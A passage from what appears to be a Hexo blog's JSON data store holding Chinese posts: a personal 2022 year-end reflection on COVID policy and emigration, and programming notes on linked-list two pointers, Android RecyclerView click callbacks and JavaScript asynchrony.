title=\"2022年度总结\"></a>2022年度总结</h1><blockquote>\n<p>持续了三年的疫情防控政策最后竟以这样一种闹剧般的方式结束了。大家让渡了三年的自由光阴，最后换来了一场空，结果大家还是难逃感染新冠的诡运。这三年，我看见了太多，思想也变了太多。</p>\n<p>最后还是难逃感染的诡运，摆烂的大环境下我无法独善其身。“能染则染，应染尽染”</p>\n<p>如此荒谬的政策竟然还有这么多人为之洗地，他们甚至拿不出自己的论据，说不过了就又搬出美国 ”你以为美国就能好到哪里去？“ ”美国死的人比我们多得多“ 真的是成为了完全不会独立思考的猪猡，我能容纳不同的观点不同的论调，但我不能容纳无理取闹。又想到了以后进入社会要为房子车子孩子给自己带上镣铐，成为一个血肉铸成的劳动机器，我就感觉未来黯淡无光，留在这个国家没有未来，只有精神和肉体的双重奴役。</p>\n<p>我累了，已经不觉得自己能改变这片土地上的苦痛哪怕一分一毫了，但我还有机会改变自己的命运。小时候父母问我未来想不想出国，我当时说我觉得中国挺好的。现在想来真是笑话，那时候我明明什么都不懂，什么负担都没有，仅仅因为热爱我土生土长的这片土地便说出了这样的话。是啊，我热爱我土生土长的这片土地，也爱着我在这片土地上邂逅的人，但即便热爱，即便难以割舍，我依然做出了决断。为什么中国每年润出去这么多人，他们难道真的一点故土情节都没有吗？我想应该多少都是有的。是什么样的苦难使他们克服了故土情节，以前我不懂。</p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"2022年度总结\"><a href=\"#2022年度总结\" class=\"headerlink\" title=\"2022年度总结\"></a>2022年度总结</h1><blockquote>\n<p>持续了三年的疫情防控政策最后竟以这样一种闹剧般的方式结束了。大家让渡了三年的自由光阴，最后换来了一场空，结果大家还是难逃感染新冠的诡运。这三年，我看见了太多，思想也变了太多。</p>\n<p>最后还是难逃感染的诡运，摆烂的大环境下我无法独善其身。“能染则染，应染尽染”</p>\n<p>如此荒谬的政策竟然还有这么多人为之洗地，他们甚至拿不出自己的论据，说不过了就又搬出美国 ”你以为美国就能好到哪里去？“ ”美国死的人比我们多得多“ 真的是成为了完全不会独立思考的猪猡，我能容纳不同的观点不同的论调，但我不能容纳无理取闹。又想到了以后进入社会要为房子车子孩子给自己带上镣铐，成为一个血肉铸成的劳动机器，我就感觉未来黯淡无光，留在这个国家没有未来，只有精神和肉体的双重奴役。</p>\n<p>我累了，已经不觉得自己能改变这片土地上的苦痛哪怕一分一毫了，但我还有机会改变自己的命运。小时候父母问我未来想不想出国，我当时说我觉得中国挺好的。现在想来真是笑话，那时候我明明什么都不懂，什么负担都没有，仅仅因为热爱我土生土长的这片土地便说出了这样的话。是啊，我热爱我土生土长的这片土地，也爱着我在这片土地上邂逅的人，但即便热爱，即便难以割舍，我依然做出了决断。为什么中国每年润出去这么多人，他们难道真的一点故土情节都没有吗？我想应该多少都是有的。是什么样的苦难使他们克服了故土情节，以前我不懂。</p>\n</blockquote>\n"},{"title":"算法笔记","date":"2022-09-29T16:00:00.000Z","author":"寒雨","hide":false,"summary":"算法笔记汇总处","_content":"\n# 算法笔记\n\n## 双指针\n\n顾名思义就是维护两个指针，多说无益，看例题\n\n> #### [剑指 Offer 22. 链表中倒数第k个节点](https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/)\n>\n> 输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。\n>\n> 例如，一个链表有 6 个节点，从头节点开始，它们的值依次是 1、2、3、4、5、6。这个链表的倒数第 3 个节点是值为 4 的节点。\n>\n>  \n>\n> 示例：\n>\n> >  给定一个链表: 1->2->3->4->5, 和 k = 2.\n> >\n> > 返回链表 4->5.\n\n~~~js\n/**\n * Definition for singly-linked list.\n * function ListNode(val) {\n *     this.val = val;\n *     this.next = null;\n * }\n */\n/**\n * @param {ListNode} head\n * @param {number} k\n * @return {ListNode}\n */\nvar getKthFromEnd = function(head, k) {\n    let [fast, slow] = [head, head]\n    while (fast && k > 0) {\n        [fast, k] = [fast.next, k - 1]\n    }\n    while (fast) {\n        [fast, slow] = [fast.next, slow.next]\n    }\n    return slow\n};\n~~~\n\n维护一快一慢两个指针，先将fast指针向前移动k+1位。再将fast与slow同步向前移动，直到fast指针抵达链表尾部空指针，然后返回slow指针。\n\n设指针长度len，首先fast指针向前移动了k+1位，故slow指针与fast一同移动的距离为len-(k+1)，即指向倒数第k个元素。","source":"_posts/algorithm-learning.md","raw":"---\ntitle: 算法笔记\ndate: 2022-9-30\nauthor: 寒雨\nhide: false\nsummary: 算法笔记汇总处\ncategories: 笔记\ntags:\n  - 算法\n---\n\n# 算法笔记\n\n## 双指针\n\n顾名思义就是维护两个指针，多说无益，看例题\n\n> #### [剑指 Offer 22. 链表中倒数第k个节点](https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/)\n>\n> 输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。\n>\n> 例如，一个链表有 6 个节点，从头节点开始，它们的值依次是 1、2、3、4、5、6。这个链表的倒数第 3 个节点是值为 4 的节点。\n>\n>  \n>\n> 示例：\n>\n> >  给定一个链表: 1->2->3->4->5, 和 k = 2.\n> >\n> > 返回链表 4->5.\n\n~~~js\n/**\n * Definition for singly-linked list.\n * function ListNode(val) {\n *     this.val = val;\n *     this.next = null;\n * }\n */\n/**\n * @param {ListNode} head\n * @param {number} k\n * @return {ListNode}\n */\nvar getKthFromEnd = function(head, k) {\n    let [fast, slow] = [head, head]\n    while (fast && k > 0) {\n        [fast, k] = [fast.next, k - 1]\n    }\n    while (fast) {\n        [fast, slow] = [fast.next, slow.next]\n    }\n    return slow\n};\n~~~\n\n维护一快一慢两个指针，先将fast指针向前移动k+1位。再将fast与slow同步向前移动，直到fast指针抵达链表尾部空指针，然后返回slow指针。\n\n设指针长度len，首先fast指针向前移动了k+1位，故slow指针与fast一同移动的距离为len-(k+1)，即指向倒数第k个元素。","slug":"algorithm-learning","published":1,"updated":"2022-12-12T15:56:46.787Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jsw0003sfkl2mzc28th","content":"<h1 id=\"算法笔记\"><a href=\"#算法笔记\" class=\"headerlink\" title=\"算法笔记\"></a>算法笔记</h1><h2 id=\"双指针\"><a href=\"#双指针\" class=\"headerlink\" title=\"双指针\"></a>双指针</h2><p>顾名思义就是维护两个指针，多说无益，看例题</p>\n<blockquote>\n<h4 id=\"剑指-Offer-22-链表中倒数第k个节点\"><a href=\"#剑指-Offer-22-链表中倒数第k个节点\" class=\"headerlink\" title=\"剑指 Offer 22. 链表中倒数第k个节点\"></a><a href=\"https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/\">剑指 Offer 22. 链表中倒数第k个节点</a></h4><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。</p>\n<p>例如，一个链表有 6 个节点，从头节点开始，它们的值依次是 1、2、3、4、5、6。这个链表的倒数第 3 个节点是值为 4 的节点。</p>\n<p>示例：</p>\n<blockquote>\n<p> 给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k = 2.</p>\n<p>返回链表 4-&gt;5.</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">/**\n * Definition for singly-linked list.\n * function ListNode(val) {\n *     this.val = val;\n *     this.next = null;\n * }\n */</span>\n<span class=\"token comment\">/**\n * @param {ListNode} head\n * @param {number} k\n * @return {ListNode}\n */</span>\n<span class=\"token keyword\">var</span> <span class=\"token function-variable function\">getKthFromEnd</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">head<span class=\"token punctuation\">,</span> k</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>head<span class=\"token punctuation\">,</span> head<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast <span class=\"token operator\">&amp;&amp;</span> k <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> k <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> slow\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>维护一快一慢两个指针，先将fast指针向前移动k+1位。再将fast与slow同步向前移动，直到fast指针抵达链表尾部空指针，然后返回slow指针。</p>\n<p>设指针长度len，首先fast指针向前移动了k+1位，故slow指针与fast一同移动的距离为len-(k+1)，即指向倒数第k个元素。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"算法笔记\"><a href=\"#算法笔记\" class=\"headerlink\" title=\"算法笔记\"></a>算法笔记</h1><h2 id=\"双指针\"><a href=\"#双指针\" class=\"headerlink\" title=\"双指针\"></a>双指针</h2><p>顾名思义就是维护两个指针，多说无益，看例题</p>\n<blockquote>\n<h4 id=\"剑指-Offer-22-链表中倒数第k个节点\"><a href=\"#剑指-Offer-22-链表中倒数第k个节点\" class=\"headerlink\" title=\"剑指 Offer 22. 链表中倒数第k个节点\"></a><a href=\"https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/\">剑指 Offer 22. 链表中倒数第k个节点</a></h4><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。</p>\n<p>例如，一个链表有 6 个节点，从头节点开始，它们的值依次是 1、2、3、4、5、6。这个链表的倒数第 3 个节点是值为 4 的节点。</p>\n<p>示例：</p>\n<blockquote>\n<p> 给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k &#x3D; 2.</p>\n<p>返回链表 4-&gt;5.</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">/**\n * Definition for singly-linked list.\n * function ListNode(val) &#123;\n *     this.val = val;\n *     this.next = null;\n * &#125;\n */</span>\n<span class=\"token comment\">/**\n * @param &#123;ListNode&#125; head\n * @param &#123;number&#125; k\n * @return &#123;ListNode&#125;\n */</span>\n<span class=\"token keyword\">var</span> <span class=\"token function-variable function\">getKthFromEnd</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">head<span class=\"token punctuation\">,</span> k</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>head<span class=\"token punctuation\">,</span> head<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast <span class=\"token operator\">&amp;&amp;</span> k <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> k <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fast<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>fast<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">,</span> slow<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> slow\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>维护一快一慢两个指针，先将fast指针向前移动k+1位。再将fast与slow同步向前移动，直到fast指针抵达链表尾部空指针，然后返回slow指针。</p>\n<p>设指针长度len，首先fast指针向前移动了k+1位，故slow指针与fast一同移动的距离为len-(k+1)，即指向倒数第k个元素。</p>\n"},{"title":"Android开发笔记其一","date":"2021-10-24T13:06:57.000Z","author":"寒雨","hide":false,"summary":"一些安卓的笔记","_content":"\n# Android开发笔记其一\n\n# RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\n\n**反例**\n\n会导致不断的创建匿名类，从而导致大量的性能浪费\n\n```kotlin\n   private var itemClickListener: (Int) -> Unit = { }\n\t\n   override fun onBindViewHolder(holder: ViewHolder, position: Int) {\n        val fruit = data[position]\n        holder.fruitImage.setImageResource(fruit.image)\n        holder.fruitName.text = fruit.name\n        holder.itemView.setOnClickListener {\n            itemClickListener(position)\n        }\n    }\n\n    /**\n     * 回调传参\n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```\n\n**正确的做法**\n\n将回调函数在ViewHolder中调用\n\n```kotlin\n    private var itemClickListener: (Int) -> Unit = { }\n\n    inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {\n\n        init {\n            view.setOnClickListener {\n                itemClickListener(bindingAdapterPosition)\n            }\n        }\n\n        val fruitImage: ImageView = view.fruitImage\n        val fruitName: TextView = view.fruitName\n    }\n    \n   /**\n     * 回调传参\n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```","source":"_posts/android-note-1.md","raw":"---\ntitle: Android开发笔记其一\ndate: 2021-10-24 21:06:57\nauthor: 寒雨\nhide: false\nsummary: 一些安卓的笔记\ncategories: 笔记\ntags:\n  - Android\n---\n\n# Android开发笔记其一\n\n# RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\n\n**反例**\n\n会导致不断的创建匿名类，从而导致大量的性能浪费\n\n```kotlin\n   private var itemClickListener: (Int) -> Unit = { }\n\t\n   override fun onBindViewHolder(holder: ViewHolder, position: Int) {\n        val fruit = data[position]\n        holder.fruitImage.setImageResource(fruit.image)\n        holder.fruitName.text = fruit.name\n        holder.itemView.setOnClickListener {\n            itemClickListener(position)\n        }\n    }\n\n    /**\n     * 回调传参\n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```\n\n**正确的做法**\n\n将回调函数在ViewHolder中调用\n\n```kotlin\n    private var itemClickListener: (Int) -> Unit = { }\n\n    inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {\n\n        init {\n            view.setOnClickListener {\n                itemClickListener(bindingAdapterPosition)\n            }\n        }\n\n        val fruitImage: ImageView = view.fruitImage\n        val fruitName: TextView = view.fruitName\n    }\n    \n   /**\n     * 回调传参\n     */\n    fun onItemClick(func: (Int) -> Unit) {\n        itemClickListener = func\n    }\n```","slug":"android-note-1","published":1,"updated":"2021-11-13T16:16:43.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt10007sfkl013k28dw","content":"<h1 id=\"Android开发笔记其一\"><a href=\"#Android开发笔记其一\" class=\"headerlink\" title=\"Android开发笔记其一\"></a>Android开发笔记其一</h1><h1 id=\"RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\"><a href=\"#RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\" class=\"headerlink\" title=\"RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\"></a>RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题</h1><p><strong>反例</strong></p>\n<p>会导致不断的创建匿名类，从而导致大量的性能浪费</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span>\n\t\n<span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onBindViewHolder</span><span class=\"token punctuation\">(</span>holder<span class=\"token operator\">:</span> ViewHolder<span class=\"token punctuation\">,</span> position<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">val</span> fruit <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span><span class=\"token punctuation\">[</span>position<span class=\"token punctuation\">]</span>\n     holder<span class=\"token punctuation\">.</span>fruitImage<span class=\"token punctuation\">.</span><span class=\"token function\">setImageResource</span><span class=\"token punctuation\">(</span>fruit<span class=\"token punctuation\">.</span>image<span class=\"token punctuation\">)</span>\n     holder<span class=\"token punctuation\">.</span>fruitName<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> fruit<span class=\"token punctuation\">.</span>name\n     holder<span class=\"token punctuation\">.</span>itemView<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>position<span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span>\n\n <span class=\"token comment\">/**\n  * 回调传参\n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>正确的做法</strong></p>\n<p>将回调函数在ViewHolder中调用</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"> <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span>\n\n <span class=\"token keyword\">inner</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token operator\">:</span> View<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> RecyclerView<span class=\"token punctuation\">.</span><span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n     <span class=\"token keyword\">init</span> <span class=\"token punctuation\">{</span>\n         view<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>bindingAdapterPosition<span class=\"token punctuation\">)</span>\n         <span class=\"token punctuation\">}</span>\n     <span class=\"token punctuation\">}</span>\n\n     <span class=\"token keyword\">val</span> fruitImage<span class=\"token operator\">:</span> ImageView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitImage\n     <span class=\"token keyword\">val</span> fruitName<span class=\"token operator\">:</span> TextView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitName\n <span class=\"token punctuation\">}</span>\n \n<span class=\"token comment\">/**\n  * 回调传参\n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Android开发笔记其一\"><a href=\"#Android开发笔记其一\" class=\"headerlink\" title=\"Android开发笔记其一\"></a>Android开发笔记其一</h1><h1 id=\"RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\"><a href=\"#RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\" class=\"headerlink\" title=\"RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题\"></a>RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题</h1><p><strong>反例</strong></p>\n<p>会导致不断的创建匿名类，从而导致大量的性能浪费</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span>\n\t\n<span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onBindViewHolder</span><span class=\"token punctuation\">(</span>holder<span class=\"token operator\">:</span> ViewHolder<span class=\"token punctuation\">,</span> position<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">val</span> fruit <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span><span class=\"token punctuation\">[</span>position<span class=\"token punctuation\">]</span>\n     holder<span class=\"token punctuation\">.</span>fruitImage<span class=\"token punctuation\">.</span><span class=\"token function\">setImageResource</span><span class=\"token punctuation\">(</span>fruit<span class=\"token punctuation\">.</span>image<span class=\"token punctuation\">)</span>\n     holder<span class=\"token punctuation\">.</span>fruitName<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> fruit<span class=\"token punctuation\">.</span>name\n     holder<span class=\"token punctuation\">.</span>itemView<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>position<span class=\"token punctuation\">)</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n\n <span class=\"token comment\">/**\n  * 回调传参\n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>正确的做法</strong></p>\n<p>将回调函数在ViewHolder中调用</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"> <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> itemClickListener<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span>\n\n <span class=\"token keyword\">inner</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token operator\">:</span> View<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> RecyclerView<span class=\"token punctuation\">.</span><span class=\"token function\">ViewHolder</span><span class=\"token punctuation\">(</span>view<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n     <span class=\"token keyword\">init</span> <span class=\"token punctuation\">&#123;</span>\n         view<span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span> <span class=\"token punctuation\">&#123;</span>\n             <span class=\"token function\">itemClickListener</span><span class=\"token punctuation\">(</span>bindingAdapterPosition<span class=\"token punctuation\">)</span>\n         <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token punctuation\">&#125;</span>\n\n     <span class=\"token keyword\">val</span> fruitImage<span class=\"token operator\">:</span> ImageView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitImage\n     <span class=\"token keyword\">val</span> fruitName<span class=\"token operator\">:</span> TextView <span class=\"token operator\">=</span> view<span class=\"token punctuation\">.</span>fruitName\n <span class=\"token punctuation\">&#125;</span>\n \n<span class=\"token comment\">/**\n  * 回调传参\n  */</span>\n <span class=\"token keyword\">fun</span> <span class=\"token function\">onItemClick</span><span class=\"token punctuation\">(</span>func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>Int<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     itemClickListener <span class=\"token operator\">=</span> func\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"对异步概念上的理解以及JavaScript异步操作实现方式","date":"2021-11-28T16:00:00.000Z","author":"寒雨","hide":false,"summary":"今天红岩前端上课的笔记","_content":"\n# 对异步概念上的理解\n\n> 对异步这个单词我早已不陌生了，从去年开始做bukkit开发开始就一直在接触这个词。然而我却从来没有真正理解过异步的含义，之前我实际上是把多线程与异步混淆了。异步操作实际上是完全可以在单线程上执行的\n\n## 什么是异步？\n\n很简单，正所谓**连续**的操作就叫**同步**，**不连续**的操作就叫**异步**。\n\n这样一看，就很好理解了。在多线程的执行环境中，我们启动一个子线程，这个子线程是**串行**执行的，自然是不连续的。\n\n那么单线程中的异步操作时怎么实现的？\n\n答案是，先执行完同步代码，最后逐个执行异步队列中的回调函数。\n\n例如javascript中的异步 （单线程）\n\n~~~javascript\nconsole.log(\"Hello\")\n// 最后执行\nsetTimeout(() => {\n   // 操作\n   console.log(\"Hello World\")\n}, 500)\nconsole.log(\"World\")\n~~~\n\n输出结果:\n\n~~~\nHello\nWorld\nHello World\n~~~\n\n## JavaScript中的异步实现方式\n\n> JavaScript中的异步除了Web Worker均为单线程实现\n\n### 